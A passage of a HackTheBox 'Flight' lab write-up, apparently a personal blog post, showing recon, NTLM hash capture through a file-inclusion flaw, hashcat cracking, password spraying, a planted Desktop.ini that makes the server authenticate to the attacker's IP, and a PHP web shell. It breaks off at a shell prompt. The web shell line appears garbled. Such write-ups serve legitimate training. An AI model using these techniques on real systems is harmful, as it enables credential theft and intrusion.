I"Q<p>This is <a href="https://app.hackthebox.com/machines/Flight">hackthebox</a> Windows machine rated as hard, with interesting cool way of exploitation start from leaking hashes, password spraying to more privileged users for system account i have demonstrated two ways to attack it the first one is by using <code class="language-plaintext highlighter-rouge">TGT delegation</code> and the other one is by using <code class="language-plaintext highlighter-rouge">JuicyPotatoNG.exe</code></p>
<h2 id="enumeration-and-recon">Enumeration and Recon.</h2>
<h3 id="nmap-scan">Nmap scan</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre></td><td class="rouge-code"><pre># Nmap 7.93 scan initiated Thu Apr  6 15:43:59 2023 as: nmap -p- -sT --open --min-rate 10000 -v -sC -sV -o nmap-scan 10.129.253.84 294651 nmap 10.129.253.84
Failed to resolve "nmap".
Increasing send delay for 10.129.253.84 from 0 to 5 due to 20 out of 66 dropped probes since last increase.
Nmap scan report for 10.129.253.84
Host is up (0.20s latency).
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-06 19:45:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  unknown
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49693/tcp open  unknown
52146/tcp open  unknown
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2023-04-06T19:46:45
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Nmap scan report for 10.129.253.84
Host is up (0.20s latency).
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-06 19:45:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  unknown
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49693/tcp open  unknown
52146/tcp open  unknown
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2023-04-06T19:46:48
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  6 15:47:43 2023 -- 3 IP addresses (2 hosts up) scanned in 223.46 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Different ports are open including port <code class="language-plaintext highlighter-rouge">80</code> <code class="language-plaintext highlighter-rouge">139</code></p>
<h3 id="web-enumeration">Web Enumeration.</h3>
<p>This is Windows machine but there is a web hosted on Apache, I will access the web to see what it does.</p>

<p><img src="/assets/img/flight/01.png" alt="image" /></p>

<p>There is nothing of interest in this web and decided to perform some more enumeration. First i will check if there is <code class="language-plaintext highlighter-rouge">smb</code>  accessible but i found nothing</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ crackmapexec smb flight.htb
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I can not access <code class="language-plaintext highlighter-rouge">smb</code> service but i will add <code class="language-plaintext highlighter-rouge">G0</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and continue to enumerate for directories.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ ffuf -u http://flight.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -ic -c
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

images                  [Status: 301, Size: 333, Words: 22, Lines: 10]
js                      [Status: 301, Size: 329, Words: 22, Lines: 10]
css                     [Status: 301, Size: 330, Words: 22, Lines: 10]
webalizer               [Status: 403, Size: 418, Words: 37, Lines: 12]
phpmyadmin              [Status: 403, Size: 418, Words: 37, Lines: 12]
licenses                [Status: 403, Size: 418, Words: 37, Lines: 12]
server-status           [Status: 403, Size: 418, Words: 37, Lines: 12]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155]
con                     [Status: 403, Size: 299, Words: 22, Lines: 10]
aux                     [Status: 403, Size: 299, Words: 22, Lines: 10]
prn                     [Status: 403, Size: 299, Words: 22, Lines: 10]
server-info             [Status: 403, Size: 418, Words: 37, Lines: 12]
:: Progress: [26584/26584] :: Job [1/1] :: 195 req/sec :: Duration: [0:02:16] :: Errors: 2 ::
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I found some important directory but all have <code class="language-plaintext highlighter-rouge">403</code> meaning i have no rights to access them.</p>

<p>Now i will do some enumeration on subdomain to find if there is any</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ic -c -fw 1546
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 1546
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91]
:: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
</pre></td></tr></tbody></table></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">ffuf</code> found subdomain <code class="language-plaintext highlighter-rouge">school</code> and to access it i will add it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with its ip address as <code class="language-plaintext highlighter-rouge">school.flight.htb</code></p>
<h3 id="school-subdomain">School subdomain</h3>
<p><img src="/assets/img/flight/02.png" alt="image" />
I will navigate to some options such as <code class="language-plaintext highlighter-rouge">about us</code> to see what will result.</p>

<p>About us page will result to the followings</p>

<p><img src="/assets/img/flight/04.png" alt="image" />
But the most interesting thing is the request <code class="language-plaintext highlighter-rouge">url</code> which seems as <code class="language-plaintext highlighter-rouge">http://school.flight.htb/index.php?view=about.html</code>.</p>

<p>Now i will try to leak <code class="language-plaintext highlighter-rouge">NTLM</code> hash by using <code class="language-plaintext highlighter-rouge">responder</code> but  with <code class="language-plaintext highlighter-rouge">http://</code> option  request was blocked and termed as malicious activity.</p>

<p><img src="/assets/img/flight/05.png" alt="image" /></p>

<p>Now i will use <code class="language-plaintext highlighter-rouge">responder</code> for the same request and i followed this <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">link</a> for the <code class="language-plaintext highlighter-rouge">lfi</code> part.</p>

<p><img src="/assets/img/flight/06.png" alt="image" /></p>

<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/flight/exploit]
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0

  To support this project:
  Patreon -&gt; https://www.patreon.com/PythonResponder
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
AppData
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.45]
    Responder IPv6             [dead:beef:2::102b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XFCJEGLBDMF]
    Responder Domain Name      [BO0T.LOCAL]
    Responder DCE-RPC Port     [45586]

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.207.163
[SMB] NTLMv2-SSP Client   : 10.129.207.163
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:c84d5db3ac0a83fa:E7494951C1ABF38AE0BB75EA276EB23E:01010000000000000027058C7D6CD9010E6B508450AF7570000000000200080042004F003000540001001E00570049004E002D005800460043004A00450047004C00420044004D00460004003400570049004E002D005800460043004A00450047004C00420044004D0046002E0042004F00300054002E004C004F00430041004C000300140042004F00300054002E004C004F00430041004C000500140042004F00300054002E004C004F00430041004C00070008000027058C7D6CD90106000400020000000800300030000000000000000000000000300000B36CE873DC367E91F921D303260FB024D2FD1FE9D1B17EE25CBB5A9956716FDF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340035000000000000000000
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now i have hash and the name which is <code class="language-plaintext highlighter-rouge">svc_apache</code></p>
<h2 id="user-account">User Account</h2>
<p>I will crack this hash with <code class="language-plaintext highlighter-rouge">hashcat</code> as show below:-</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>SVC_APACHE::flight:68efd85e6c4b84ff:c8b22afbc36104b9564a76e73f5e9855:01010000000000008028ec2ead68d901be6dc104ebbba37a0000000002000800450056004600410001001e00570049004e002d004f0058005900410037004b0046004a004c004c00430004003400570049004e002d004f0058005900410037004b0046004a004c004c0043002e0045005600460041002e004c004f00430041004c000300140045005600460041002e004c004f00430041004c000500140045005600460041002e004c004f00430041004c00070008008028ec2ead68d90106000400020000000800300030000000000000000000000000300000eb5fda1f50c8e1a45190af83a54914388ee5bdfc431cd179bf57bc75604983010a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330035000000000000000000:S@Ss!K@*t13
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The password is  <code class="language-plaintext highlighter-rouge">S@Ss!K@*t13</code></p>
<h3 id="more-enumeration">More Enumeration</h3>
<p>Checking for <code class="language-plaintext highlighter-rouge">smb</code> service to see if user <code class="language-plaintext highlighter-rouge">svc_apache</code> can access now <code class="language-plaintext highlighter-rouge">smb</code> with the obtained password</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13'                                                                                     1 ⨯
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>From <code class="language-plaintext highlighter-rouge">crackmapexec</code> user <code class="language-plaintext highlighter-rouge">svc_apache</code> has access, then is will use  <code class="language-plaintext highlighter-rouge">smpmap</code> to check for the files and directories with their permissions.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ smbmap -H 10.129.207.163 -u svc_apache -p 'S@Ss!K@*t13'
[+] IP: 10.129.207.163:445      Name: flight.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
        Web                                                     READ ONLY
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I found that all files and directories are read only which means more privileges user is required to have more access.</p>
<h3 id="ad-users-and-enumeration-with-password-spraying">AD Users and Enumeration with Password Spraying.</h3>
<p>I will search for Active Directory Users by using <code class="language-plaintext highlighter-rouge">crackmapexec</code> by using the following command:-</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/flight/exploit]
└─$ crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users  | awk -F \\ '{print $2}' | awk  '{print $1}'|tail -n 15 &gt; users
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>O.Possum
svc_apache
V.Stevens
D.Truff
I.Francis
W.Walker
C.Bum
M.Gold
L.Kein
G.Lors
R.Cold
S.Moon
krbtgt
Guest
Administrator
</pre></td></tr></tbody></table></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Password Spraying</code>, Since i have more users then i tried to check other users who reuse the same password as user <code class="language-plaintext highlighter-rouge">svc_apache</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ crackmapexec smb flight.htb -u users -p 'S@Ss!K@*t13' --continue-on-success | grep "[+]" 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Seems there is another user named <code class="language-plaintext highlighter-rouge">S.Moon</code> who is using the same password <code class="language-plaintext highlighter-rouge">S@Ss!K@*t13</code>. Up to now i can use the same procedures to check for <code class="language-plaintext highlighter-rouge">smb</code> to see if this new user has more privileges.</p>

<p>I will check <code class="language-plaintext highlighter-rouge">smb</code> again but now the only difference is I will be using new user <code class="language-plaintext highlighter-rouge">S.Moon</code> with the same password as user <code class="language-plaintext highlighter-rouge">svc_apache</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ smbmap -H 10.129.207.163 -u S.Moon -p 'S@Ss!K@*t13' -d flight.htb                                                                            130 ⨯
[+] IP: 10.129.207.163:445      Name: flight.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
        Web                                                     READ ONLY
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This user has read and write access to folder named <code class="language-plaintext highlighter-rouge">Shared</code>, now i will navigate to this directory and check if there is anything interesting by using <code class="language-plaintext highlighter-rouge">smblient</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ smbclient //10.129.207.163/Shared -U S.Moon --password 'S@Ss!K@*t13'
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>smb: \&gt; dir
  .                                   D        0  Wed Apr 12 01:28:54 2023
  ..                                  D        0  Wed Apr 12 01:28:54 2023

                5056511 blocks of size 4096. 1239732 blocks available
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I will use the same <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">link</a> but this time i will check for other places that can provide <code class="language-plaintext highlighter-rouge">ntlm-hash</code> and i found one of them is <code class="language-plaintext highlighter-rouge">Desktop.ini</code> and since i can read and write in this directory then i will create this file and upload it by using the following steps:</p>

<p>I will create <code class="language-plaintext highlighter-rouge">desktop.ini</code> file by using vim and adding the followings:-</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>[.ShellClassInfo]
IconFile=\\10.10.14.45\gems
</pre></td></tr></tbody></table></code></pre></div></div>
<p>To upload this file i will use <code class="language-plaintext highlighter-rouge">put</code> in <code class="language-plaintext highlighter-rouge">smbclient</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>smb: \&gt; put Desktop.ini
putting file Desktop.ini as \Desktop.ini (0.1 kb/s) (average 0.1 kb/s)
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now i can fire up <code class="language-plaintext highlighter-rouge">responder</code> again or <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> all can listen to client and leak the hash, i will use <code class="language-plaintext highlighter-rouge">impacket-smbserver</code></p>

<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/flight]
└─$ impacket-smbserver gems . -smb2support 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.207.163,52230)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:91e698ee3eb0a4ac348904b4140ff88a:01010000000000000067c6888e6cd901bd8bb11894c5e26900000000010010005400630051006a004100620041005800030010005400630051006a0041006200410058000200100076004200440056004c006b0069006d000400100076004200440056004c006b0069006d00070008000067c6888e6cd90106000400020000000800300030000000000000000000000000300000b36ce873dc367e91f921d303260fb024d2fd1fe9d1b17ee25cbb5a9956716fdf0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340035000000000000000000
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I will use <code class="language-plaintext highlighter-rouge">hashcat</code> again to crack this new hash</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/flight/exploit/hashes]
└─$ hashcat -m 5600 hash2 /usr/share/wordlists/rockyou.txt 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>C.BUM::flight.htb:aaaaaaaaaaaaaaaa:a95b6278576cb4edc766ed9ce36b0786:01010000000000008059cbb28d6cd90136038224470b41130000000001001000490044007900520057005500500079000300100049004400790052005700550050007900020010004f0064004e004a006b00490073004a00040010004f0064004e004a006b00490073004a00070008008059cbb28d6cd90106000400020000000800300030000000000000000000000000300000b36ce873dc367e91f921d303260fb024d2fd1fe9d1b17ee25cbb5a9956716fdf0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340035000000000000000000:Tikkycoll_431012284
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now i have user account with name <code class="language-plaintext highlighter-rouge">C.Bum</code> his password <code class="language-plaintext highlighter-rouge">Tikkycoll_431012284</code> I can access  <code class="language-plaintext highlighter-rouge">Users</code> folder from <code class="language-plaintext highlighter-rouge">shares</code> to take user flag.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>smb: \c.bum\desktop\&gt; dir
  .                                  DR        0  Thu Sep 22 23:17:02 2022
  ..                                 DR        0  Thu Sep 22 23:17:02 2022
  user.txt                           AR       34  Tue Apr 11 18:30:25 2023

                5056511 blocks of size 4096. 1238532 blocks available
smb: \c.bum\desktop\&gt; get user.txt
getting file \c.bum\desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>User Flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/flight/exploit]
└─$ cat user.txt
bc97d5393bfe62a1a5c1f7c749df2946
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="root-user">Root User.</h2>
<p>I will create and upload a simple <code class="language-plaintext highlighter-rouge">php</code> payload written as follows</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">([</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Upload it to <code class="language-plaintext highlighter-rouge">flight.htb</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/C7F5/htb/Machine/flight]
